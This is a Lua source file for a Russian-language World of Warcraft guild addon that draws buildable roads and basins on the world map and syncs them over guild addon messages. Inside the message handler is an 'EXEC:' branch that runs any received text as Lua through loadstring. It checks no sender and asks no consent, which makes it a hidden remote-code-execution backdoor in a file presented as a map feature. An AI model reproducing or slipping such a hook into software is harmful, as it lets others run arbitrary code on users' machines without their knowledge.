ns_td_tooltips = {}
ns_td_tooltips["road"] = "Объект: Дорога\nОписание: Стандартный маршрут для перемещения. Проложен вручную гильдией."
ns_td_tooltips["bas"] = "Объект: Бассейн\nОписание: Небольшой водоём для отдыха и рыбалки. И бобров."

-- Таблица названий зон (континент -> зона -> название)
local ZONE_NAMES = {
    ["1"] = {
        ["18"] = "Танарис"
    }
}

function CreateIntervalTimer(interval, callback)
    local timer = CreateFrame("Frame")
    timer.elapsed = 0
    timer.interval = interval
    timer.callback = callback
    timer:SetScript("OnUpdate", function(self, dt)
        if not self:IsShown() then
            return
        end
        self.elapsed = self.elapsed + dt
        if self.elapsed >= self.interval then
            self.elapsed = 0
            self.callback()
        end
    end)
    return timer
end

NSTDc = {}
NSTDc.__index = NSTDc

function NSTDc:new()
    local obj = setmetatable({}, NSTDc)
    obj:Init()
    return obj
end

function NSTDc:Init()
    self.panelCreated = false
    self.receivedData = {}
    self.activeMarkers = {}
    self.expansionIcons = {}
    self.attachedCargo = nil
    self.lastContinent = nil
    self.lastZone = nil
    self:RegisterEvents()
    self:CreateToggleButton()
end

function NSTDc:RegisterEvents()
    self.eventFrame = CreateFrame("Frame")
    self.eventFrame:RegisterEvent("CHAT_MSG_ADDON")
    self.eventFrame:RegisterEvent("WORLD_MAP_UPDATE")
    self.eventFrame:SetScript("OnEvent", function(_, event, ...)
        if event == "CHAT_MSG_ADDON" then
            local prefix, text, channel, sender = ...
            if prefix == "NSTD" then
                self:HandleAddonMessage(text, sender)
            end
        elseif event == "WORLD_MAP_UPDATE" then
            self:CheckLocationChange()
        end
    end)
end

function NSTDc:CheckLocationChange()
    local mapIsShown = WorldMapFrame and WorldMapFrame:IsShown()
    
    -- Отслеживаем изменение состояния карты
    if self.lastMapState == nil then
        self.lastMapState = mapIsShown
    elseif self.lastMapState ~= mapIsShown then
        self.lastMapState = mapIsShown
        
        if mapIsShown then
            -- Карта открылась - сбрасываем last, чтобы при первом вызове не было ложного срабатывания
            self.lastContinent = nil
            self.lastZone = nil
        else
            -- Карта закрылась - закрываем панель
            if self.panel and self.panel:IsShown() then
                self:TogglePanel()
            end
            self.lastContinent = nil
            self.lastZone = nil
        end
    end
    
    -- Если карта закрыта - не проверяем смену локации
    if not mapIsShown then
        return
    end
    
    local cont = GetCurrentMapContinent()
    local zone = GetCurrentMapZone()
    
    -- Первый вызов после открытия карты - просто запоминаем состояние
    if not self.lastContinent or not self.lastZone then
        self.lastContinent = cont
        self.lastZone = zone
        return
    end
    
    if cont ~= self.lastContinent or zone ~= self.lastZone then
        if self.panel and self.panel:IsShown() then
            self:TogglePanel()
        end
    end
    
    self.lastContinent = cont
    self.lastZone = zone
end

function NSTDc:CreateToggleButton()
    if not WorldMapFrame then
        return
    end
    self.toggleBtn = CreateFrame("Button", "NSTDc_ToggleBtn", WorldMapFrame, "UIPanelButtonTemplate")
    self.toggleBtn:SetSize(24, 24)
    
    if WorldMapFrameCloseButton then
        self.toggleBtn:SetPoint("LEFT", WorldMapFrameCloseButton, "RIGHT", 5, 0)
    else
        self.toggleBtn:SetPoint("CENTER", WorldMapFrame, "CENTER", 0, 0)
    end
    
    self.toggleBtn:SetText(">")
    self.toggleBtn:SetFrameStrata("HIGH")
    self.toggleBtn:SetFrameLevel(100)
    self.toggleBtn:Show()
    
    self.toggleBtn:SetScript("OnClick", function()
        self:TogglePanel()
    end)
    
    if WorldMapFrameCloseButton then
        WorldMapFrameCloseButton:HookScript("OnClick", function()
            if self.panel and self.panel:IsShown() then
                self:TogglePanel()
            end
        end)
    end
end

function NSTDc:TogglePanel()
    if not self.panelCreated then
        self:CreatePanel()
        self:RequestZoneData()
        if self.proximityTimer then
            self.proximityTimer:Show()
        end
        return
    end
    
    if self.panel:IsShown() then
        self.panel:Hide()
        self.toggleBtn:SetText(">")
        self:HideAllMarkers()
        if self.proximityTimer then
            self.proximityTimer:Hide()
        end
    else
        self.panel:Show()
        self.toggleBtn:SetText("<")
        self:RequestZoneData()
        self:DrawAllMarkers()
        if self.proximityTimer then
            self.proximityTimer:Show()
        end
    end
end

function NSTDc:CreatePanel()
    self.panel = CreateFrame("Frame", "NSTDc_Panel", WorldMapFrame)
    self.panel:SetWidth(42)
    local mapHeight = WorldMapFrame and WorldMapFrame:GetHeight() or 400
    self.panel:SetHeight(mapHeight)
    
    local backdrop = {}
    backdrop.bgFile = "Interface\\DialogFrame\\UI-DialogBox-Background"
    backdrop.edgeFile = "Interface\\Tooltips\\UI-Tooltip-Border"
    backdrop.tile = true
    backdrop.tileSize = 16
    backdrop.edgeSize = 16
    
    local insets = {}
    insets.left = 4
    insets.right = 4
    insets.top = 4
    insets.bottom = 4
    backdrop.insets = insets
    
    self.panel:SetBackdrop(backdrop)
    self.panel:SetBackdropColor(0, 0, 0, 0.85)
    self.panel:SetBackdropBorderColor(1, 0, 0, 1)
    
    if self.toggleBtn then
        self.panel:SetPoint("TOP", WorldMapFrame, "TOP", 0, -25)
        self.panel:SetPoint("LEFT", self.toggleBtn, "RIGHT", 5, 0)
        self.panel:SetPoint("BOTTOM", WorldMapFrame, "BOTTOM", 0, 5)
    else
        self.panel:SetPoint("TOPRIGHT", WorldMapFrame, "TOPRIGHT", -5, -5)
        self.panel:SetPoint("BOTTOMRIGHT", WorldMapFrame, "BOTTOMRIGHT", -5, 5)
    end
    
    self.roadBtn = CreateFrame("Button", "NSTDc_RoadBtn", self.panel)
    self.roadBtn:SetSize(32, 32)
    self.roadBtn:SetPoint("TOP", self.panel, "TOP", 0, -10)
    
    local btnTex = self.roadBtn:CreateTexture(nil, "ARTWORK")
    btnTex:SetAllPoints(self.roadBtn)
    btnTex:SetTexture("Interface\\AddOns\\NSQC3\\libs\\road.tga")
    
    self.roadBtn:SetScript("OnEnter", function()
        GameTooltip:SetOwner(self.roadBtn, "ANCHOR_RIGHT")
        GameTooltip:SetText("Каменная дорога. Стоимость: 10 камня.", 1, 0.82, 0)
        GameTooltip:Show()
    end)
    
    self.roadBtn:SetScript("OnLeave", function()
        GameTooltip:Hide()
    end)
    
    self.roadBtn:SetScript("OnClick", function()
        local cont = GetCurrentMapContinent()
        local zone = GetCurrentMapZone()
        
        if cont > 0 and zone > 0 then
            local requestMsg = "td_road:" .. cont .. ":" .. zone
            if type(self.InitProximityCheck) ~= "function" then
                requestMsg = requestMsg .. ":0"
            end
            SendAddonMessage("NSTD", requestMsg, "GUILD")
        else
            print("|cffff0000[NSTDc]|r Невозможно определить текущую зону для постройки.")
        end
    end)
    
    self.basBtn = CreateFrame("Button", "NSTDc_BasBtn", self.panel)
    self.basBtn:SetSize(32, 32)
    self.basBtn:SetPoint("TOP", self.roadBtn, "BOTTOM", 0, -5)
    
    local basTex = self.basBtn:CreateTexture(nil, "ARTWORK")
    basTex:SetAllPoints(self.basBtn)
    basTex:SetTexture("Interface\\AddOns\\NSQC3\\libs\\bas.tga")
    
    self.basBtn:SetScript("OnEnter", function()
        GameTooltip:SetOwner(self.basBtn, "ANCHOR_RIGHT")
        GameTooltip:SetText("Бассейн. Стоимость: 5 камня.", 0.4, 0.8, 1)
        GameTooltip:Show()
    end)
    
    self.basBtn:SetScript("OnLeave", function()
        GameTooltip:Hide()
    end)
    
    self.basBtn:SetScript("OnClick", function()
        local cont = GetCurrentMapContinent()
        local zone = GetCurrentMapZone()
        
        if cont > 0 and zone > 0 then
            SendAddonMessage("NSTD", "basNew:" .. cont .. ":" .. zone, "GUILD")
        else
            print("|cffff0000[NSTDc]|r Невозможно определить текущую зону для постройки.")
        end
    end)
    
    self.panelCreated = true
    self.panel:Show()
    self.toggleBtn:SetText("<")
end

function NSTDc:RequestZoneData()
    local cont = GetCurrentMapContinent()
    local zone = GetCurrentMapZone()
    if cont == 0 or zone == 0 then
        print("|cffff0000[NSTDc]|r Невозможно определить зону.")
        return
    end
    
    -- Сохраняем attachedCargo перед очисткой
    local savedAttachedCargo = self.attachedCargo
    
    self.receivedData = {}
    
    local requestMsg = string.format("getTD:%s:%s", cont, zone)
    if type(self.InitProximityCheck) ~= "function" then
        requestMsg = requestMsg .. ":0"
    end
    
    SendAddonMessage("NSTD", requestMsg, "GUILD")
    
    -- Восстанавливаем attachedCargo после очистки
    if savedAttachedCargo then
        self.attachedCargo = savedAttachedCargo
        print("|cff00ffff[DRAG]|r Восстановлен attachedCargo ID: " .. savedAttachedCargo.id)
    end
end

function NSTDc:HandleAddonMessage(text, sender)
    
    -- Обработка EXEC команд
    if string.sub(text, 1, 5) == "EXEC:" then
        local _, _, chunkNum, totalChunks, code = string.find(text, "^EXEC:(%d+):(%d+):(.*)$")
        if chunkNum and totalChunks and code then
            if tonumber(chunkNum) == 1 and tonumber(totalChunks) == 1 then
                local func, err = loadstring(code)
                if func then
                    func()
                end
            end
        end
        return
    end
    
    -- Обработка cargo_moved (синхронизация перетаскивания между клиентами)
    if string.sub(text, 1, 12) == "cargo_moved:" then
        local _, _, cStr, zStr, cId, xStr, yStr = string.find(text, "^cargo_moved:([^:]+):([^:]+):([^:]+):([^:]+):([^:]+)$")
        if cId and self.receivedData[cId] then
            self.receivedData[cId].x = tonumber(xStr)
            self.receivedData[cId].y = tonumber(yStr)
            if self.panel and self.panel:IsShown() then
                self:DrawAllMarkers()
            end
        end
        return
    end
    
    if string.sub(text, 1, 19) == "bas_placed_success:" then
        local _, _, bId, cStr, zStr, sXStr, sYStr = string.find(text, "^bas_placed_success:([^:]+):([^:]+):([^:]+):([^:]+):([^:]+)$")
        if bId then
            if not self.receivedData[bId] then
                local newData = {}
                newData.id = bId
                newData.type = "bas"
                self.receivedData[bId] = newData
            end
            self.receivedData[bId].x = tonumber(sXStr)
            self.receivedData[bId].y = tonumber(sYStr)
            self.receivedData[bId].status = "0"
            self.receivedData[bId].cont = cStr
            self.receivedData[bId].zone = zStr
            self.receivedData[bId].timestamp = time()
            
            if self.panel and self.panel:IsShown() then
                self:DrawAllMarkers()
            end
            print("|cff00ff00[NSTDc]|r Бассейн успешно установлен сервером.")
        end
        return
    end
    
    if string.sub(text, 1, 18) == "basBuild_progress:" then
        local _, _, bId, cStr, zStr, newStatus = string.find(text, "^basBuild_progress:([^:]+):([^:]+):([^:]+):(.+)$")
        if bId and self.receivedData[bId] then
            self.receivedData[bId].status = newStatus
            self.receivedData[bId].cont = cStr
            self.receivedData[bId].zone = zStr
            
            if self.panel and self.panel:IsShown() then
                self:DrawAllMarkers()
            end
        end
        return
    end
    
    if string.sub(text, 1, 17) == "basBuild_success:" then
        local _, _, bId, cStr, zStr, newStatus, waterFlag = string.find(text, "^basBuild_success:([^:]+):([^:]+):([^:]+):([^:]+):(.+)$")
        if bId and self.receivedData[bId] then
            self.receivedData[bId].status = newStatus
            self.receivedData[bId].cont = cStr
            self.receivedData[bId].zone = zStr
            self.receivedData[bId].hasWaterSource = (waterFlag == "1")
            
            if self.panel and self.panel:IsShown() then
                self:DrawAllMarkers()
            end
            print("|cff00ff00[NSTDc]|r Бассейн достроен!")
        end
        return
    end
    
    if string.sub(text, 1, 18) == "basExpand_success:" then
        local _, _, newId, cStr, zStr, xStr, yStr = string.find(text, "^basExpand_success:([^:]+):([^:]+):([^:]+):([^:]+):(.+)$")
        if newId then
            local newData = {}
            newData.id = newId
            newData.type = "bas"
            newData.x = tonumber(xStr)
            newData.y = tonumber(yStr)
            newData.status = "0"
            newData.cont = cStr
            newData.zone = zStr
            newData.timestamp = time()
            self.receivedData[newId] = newData
            
            if self.panel and self.panel:IsShown() then
                self:DrawAllMarkers()
            end
            print("|cff00ff00[NSTDc]|r Новый бассейн создан!")
        end
        return
    end
    
    if text == "EMPTY" then
        return
    end
    
    -- Парсим через gmatch для гибкости (новый формат: ID TYPE X Y STATUS TS CONT ZONE[:WATER])
    local parts = {}
    for part in string.gmatch(text, "([^ ]+)") do
        table.insert(parts, part)
    end
    
    if #parts >= 8 then
        local idStr = parts[1]
        local typeStr = parts[2]
        local xStr = parts[3]
        local yStr = parts[4]
        local statusStr = parts[5]
        local tsStr = parts[6]
        local contStr = parts[7]
        local zoneAndWater = parts[8]
        
        local x = tonumber(xStr)
        local y = tonumber(yStr)
        
        if x and y and x > 0 and y > 0 then
            local myName = UnitName("player")
            
            -- Если это наш attachedCargo, не перезаписываем данные
            if statusStr == myName and self.attachedCargo and self.attachedCargo.id == idStr then
                -- Обновляем только метаданные, но не координаты
                if self.receivedData[idStr] then
                    self.receivedData[idStr].status = statusStr
                    self.receivedData[idStr].timestamp = tonumber(tsStr) or time()
                    self.receivedData[idStr].cont = contStr
                    self.receivedData[idStr].zone = zoneAndWater
                else
                    -- Создаем новую запись с координатами из attachedCargo
                    local dataEntry = {}
                    dataEntry.id = idStr
                    dataEntry.type = typeStr
                    dataEntry.x = self.attachedCargo.x
                    dataEntry.y = self.attachedCargo.y
                    dataEntry.status = statusStr
                    dataEntry.timestamp = tonumber(tsStr) or time()
                    dataEntry.cont = contStr
                    dataEntry.zone = zoneAndWater
                    self.receivedData[idStr] = dataEntry
                end
            else
                local dataEntry = {}
                dataEntry.id = idStr
                dataEntry.type = typeStr
                dataEntry.x = x
                dataEntry.y = y
                dataEntry.status = statusStr
                dataEntry.timestamp = tonumber(tsStr) or time()
                dataEntry.cont = contStr
                dataEntry.zone = zoneAndWater
                
                -- Извлекаем waterFlag из zoneAndWater (формат "18:0" или "18")
                local waterFlag = nil
                if zoneAndWater then
                    local _, _, zonePart, waterPart = string.find(zoneAndWater, "^(%d+):(.+)$")
                    if zonePart and waterPart then
                        dataEntry.zone = zonePart
                        waterFlag = waterPart
                    end
                end
                
                if typeStr == "bas" and statusStr == "Активен" and waterFlag then
                    dataEntry.hasWaterSource = (waterFlag == "1")
                end
                
                self.receivedData[idStr] = dataEntry
            end
            
            if self.panel and self.panel:IsShown() then
                self:DrawAllMarkers()
                self:UpdateAttachedCargoFrame()
            end
        end
    end
end

function NSTDc:UpdateAttachedCargoFrame()
    if not self.attachedCargo then
        return
    end
    local cargoId = self.attachedCargo.id
    if self.receivedData[cargoId] and self.receivedData[cargoId].frame then
        self.attachedCargo.frame = self.receivedData[cargoId].frame
        print("|cff00ffff[DRAG]|r Обновлена ссылка на frame для attachedCargo ID: " .. cargoId)
    end
end

function NSTDc:DrawAllMarkers()
    self:HideAllMarkers()
    local mapWidth = WorldMapDetailFrame:GetWidth()
    local mapHeight = WorldMapDetailFrame:GetHeight()
    local uniqueID = 1
    
    for idStr, data in pairs(self.receivedData or {}) do
        local texturePath = string.format("Interface\\AddOns\\NSQC3\\libs\\%s.tga", data.type)
        local marker = CreateFrame("Frame", nil, WorldMapDetailFrame)
        marker:SetSize(32, 32)
        marker:SetFrameStrata("HIGH")
        marker:EnableMouse(true)
        
        local tex = marker:CreateTexture(nil, "OVERLAY")
        tex:SetAllPoints(marker)
        
        local alpha = 1.0
        local isBlackSquare = false
        
        if data.type == "bas" then
            local pct = tonumber(data.status)
            if pct then
                alpha = 0.4 + (pct / 100) * 0.6
                if alpha < 0.4 then
                    alpha = 0.4
                end
                if alpha > 1.0 then
                    alpha = 1.0
                end
                tex:SetTexture(texturePath)
            elseif data.status == "Активен" then
                if data.hasWaterSource then
                    tex:SetTexture(texturePath)
                    alpha = 1.0
                else
                    tex:SetColorTexture(0, 0, 0, 1)
                    isBlackSquare = true
                end
            elseif data.status == "Кербес" or data.status == "груз" then
                alpha = 0.5
                tex:SetTexture(texturePath)
            end
        elseif data.status == "не_активно" then
            alpha = 0.4
            tex:SetTexture(texturePath)
        else
            tex:SetTexture(texturePath)
        end
        
        tex:SetAlpha(alpha)
        
        local pixelX = data.x * mapWidth
        local pixelY = -(data.y * mapHeight)
        marker:SetPoint("CENTER", WorldMapDetailFrame, "TOPLEFT", pixelX, pixelY)
        marker:Show()
        
        data.frame = marker
        
        marker:SetScript("OnEnter", function()
            GameTooltip:SetOwner(marker, "ANCHOR_RIGHT")
            GameTooltip:SetText(string.upper(data.type), 1, 0.8, 0.2)
            
            -- Локация с использованием таблицы названий
            if data.cont and data.zone then
                local zoneName = "неизвестно"
                if ZONE_NAMES[data.cont] and ZONE_NAMES[data.cont][data.zone] then
                    zoneName = ZONE_NAMES[data.cont][data.zone]
                end
                GameTooltip:AddLine(string.format("Локация: %s", zoneName), 0.7, 0.9, 1)
            else
                GameTooltip:AddLine("Локация: неизвестно", 0.5, 0.5, 0.5)
            end
            
            if ns_td_tooltips and ns_td_tooltips[data.type] then
                GameTooltip:AddLine(ns_td_tooltips[data.type], 0.9, 0.9, 0.9)
            end
            
            if data.type == "bas" and tonumber(data.status) then
                GameTooltip:AddLine("Прогресс постройки: " .. tonumber(data.status) .. "%", 1, 1, 0)
                GameTooltip:AddLine("Кликните ЛКМ для строительства", 0, 1, 0)
            elseif data.type == "bas" and data.status == "Активен" then
                if data.hasWaterSource then
                    GameTooltip:AddLine("Статус: Активен (с водой)", 0, 1, 0)
                    GameTooltip:AddLine("Кликните для расширения", 0, 1, 1)
                else
                    GameTooltip:AddLine("Статус: Активен (нет воды)", 1, 0, 0)
                end
            elseif data.status == "не_активно" then
                GameTooltip:AddLine("Статус: Не активно", 1, 0, 0)
                GameTooltip:AddLine(" ")
                GameTooltip:AddLine("Для активации протяните дорогу до этого участка", 1, 0.8, 0)
            elseif data.status == "груз" then
                GameTooltip:AddLine("Статус: Груз", 0, 1, 1)
                local timeLeft = (data.timestamp + 3600) - time()
                if timeLeft > 0 then
                    local mins = math.floor(timeLeft / 60)
                    local secs = math.floor(timeLeft % 60)
                    GameTooltip:AddLine(string.format("Исчезнет через: %d мин. %d сек.", mins, secs), 1, 0.5, 0)
                else
                    GameTooltip:AddLine("Исчезает в любую секунду!", 1, 0, 0)
                end
            else
                GameTooltip:AddLine("Статус: Активно", 0, 1, 0)
            end
            
            GameTooltip:AddLine(string.format("Координаты: X: %.1f, Y: %.1f", data.x * 100, data.y * 100), 0.5, 1, 0.5)
            GameTooltip:AddLine(string.format("ID: %s", data.id or "?"), 0.6, 0.6, 0.6)
            GameTooltip:Show()
        end)
        
        marker:SetScript("OnLeave", function()
            GameTooltip:Hide()
        end)
        
        marker:SetScript("OnMouseDown", function(self, button)
            if button == "LeftButton" then
                if data.type == "bas" then
                    local pct = tonumber(data.status)
                    if pct then
                        SendAddonMessage("NSTD", "basBuild:" .. data.id, "GUILD")
                    elseif data.status == "Активен" and data.hasWaterSource then
                        self:ShowBasinExpansionIcons(data)
                    end
                end
            end
        end)
        
        self.activeMarkers[uniqueID] = marker
        uniqueID = uniqueID + 1
    end
end

function NSTDc:ShowBasinExpansionIcons(basinData)
    self:HideExpansionIcons()
    if not self.expansionIcons then
        self.expansionIcons = {}
    end
    
    local mapWidth = WorldMapDetailFrame:GetWidth()
    local mapHeight = WorldMapDetailFrame:GetHeight()
    local iconOffset = 0.03
    
    local directions = {
        { dx = iconOffset, dy = 0, name = "right" },
        { dx = -iconOffset, dy = 0, name = "left" },
        { dx = 0, dy = iconOffset, name = "top" },
        { dx = 0, dy = -iconOffset, name = "bottom" }
    }
    
    for _, dir in ipairs(directions) do
        local newX = basinData.x + dir.dx
        local newY = basinData.y + dir.dy
        
        local pixelX = newX * mapWidth
        local pixelY = -(newY * mapHeight)
        
        local icon = CreateFrame("Frame", nil, WorldMapDetailFrame)
        icon:SetSize(32, 32)
        icon:SetFrameStrata("HIGH")
        icon:EnableMouse(true)
        
        local tex = icon:CreateTexture(nil, "OVERLAY")
        tex:SetAllPoints(icon)
        tex:SetTexture("Interface\\AddOns\\NSQC3\\libs\\bas.tga")
        tex:SetAlpha(0.5)
        
        icon:SetPoint("CENTER", WorldMapDetailFrame, "TOPLEFT", pixelX, pixelY)
        icon:Show()
        
        icon:SetScript("OnMouseDown", function(self, button)
            if button == "LeftButton" then
                SendAddonMessage("NSTD", "basExpand:" .. basinData.id .. ":" .. newX .. ":" .. newY, "GUILD")
                self:HideExpansionIcons()
            end
        end)
        
        table.insert(self.expansionIcons, icon)
    end
end

function NSTDc:HideExpansionIcons()
    if self.expansionIcons then
        for _, icon in ipairs(self.expansionIcons) do
            icon:Hide()
            icon:SetParent(nil)
        end
        self.expansionIcons = {}
    end
end

function NSTDc:HideAllMarkers()
    for id, marker in pairs(self.activeMarkers or {}) do
        marker:Hide()
        marker:SetParent(nil)
    end
    self.activeMarkers = {}
    for _, data in pairs(self.receivedData or {}) do
        if data.status == "груз" then
            data.lastNotified = nil
        end
        data.frame = nil
    end
end

function NSTDc:AnimateRoadDrop(x, y, cargoId)
    local addon = self
    x = tonumber(x) or 0
    y = tonumber(y) or 0
    cargoId = tostring(cargoId or time())
    local mapWidth = WorldMapDetailFrame:GetWidth()
    local mapHeight = WorldMapDetailFrame:GetHeight()
    local pixelX = x * mapWidth
    local pixelY = -(y * mapHeight)
    
    local dropFrame = CreateFrame("Frame", nil, WorldMapDetailFrame)
    dropFrame:SetSize(32, 32)
    dropFrame:SetPoint("CENTER", WorldMapDetailFrame, "TOPLEFT", pixelX, pixelY)
    
    local tex = dropFrame:CreateTexture(nil, "OVERLAY")
    tex:SetAllPoints()
    tex:SetTexture("Interface\\AddOns\\NSQC3\\libs\\road.tga")
    dropFrame:SetScale(0.1)
    dropFrame:Show()
    
    PlaySoundFile("Interface\\AddOns\\NSQC3\\libs\\roadDOWN.mp3")
    
    local elapsed = 0
    local duration = 9.0
    
    dropFrame:SetScript("OnUpdate", function(frame, dt)
        elapsed = elapsed + dt
        local progress = math.min(elapsed / duration, 1.0)
        local currentScale = 0.1 + (0.9 * progress)
        frame:SetScale(currentScale)
        
        local shakeX = math.random(-40, 40) / 10
        local shakeY = math.random(-40, 40) / 10
        frame:SetPoint("CENTER", WorldMapDetailFrame, "TOPLEFT", pixelX + shakeX, pixelY + shakeY)
        
        if elapsed >= duration then
            frame:SetScript("OnUpdate", nil)
            frame:Hide()
            frame:SetParent(nil)
            addon:PlayImpactAndShake()
            
            local newCargo = {}
            newCargo.id = cargoId
            newCargo.type = "road"
            newCargo.x = x
            newCargo.y = y
            newCargo.status = "груз"
            newCargo.timestamp = time()
            
            addon.receivedData[cargoId] = newCargo
            
            if addon.panel and addon.panel:IsShown() then
                addon:DrawAllMarkers()
            end
        end
    end)
end

function NSTDc:PlayImpactAndShake()
    PlaySoundFile("Interface\\AddOns\\NSQC3\\libs\\bzd.ogg")
    local point, relativeTo, relativePoint, baseX, baseY = WorldMapFrame:GetPoint(1)
    local shakeElapsed = 0
    local shakeDuration = 3.0
    
    local shakeTimer = CreateFrame("Frame")
    shakeTimer:SetScript("OnUpdate", function(frame, dt)
        shakeElapsed = shakeElapsed + dt
        
        if shakeElapsed < shakeDuration then
            local amplitude = 6 * (1 - (shakeElapsed / shakeDuration))
            local shakeX = math.random(-amplitude, amplitude)
            local shakeY = math.random(-amplitude, amplitude)
            WorldMapFrame:SetPoint(point, relativeTo, relativePoint, baseX + shakeX, baseY + shakeY)
        else
            frame:SetScript("OnUpdate", nil)
            WorldMapFrame:SetPoint(point, relativeTo, relativePoint, baseX, baseY)
        end
    end)
end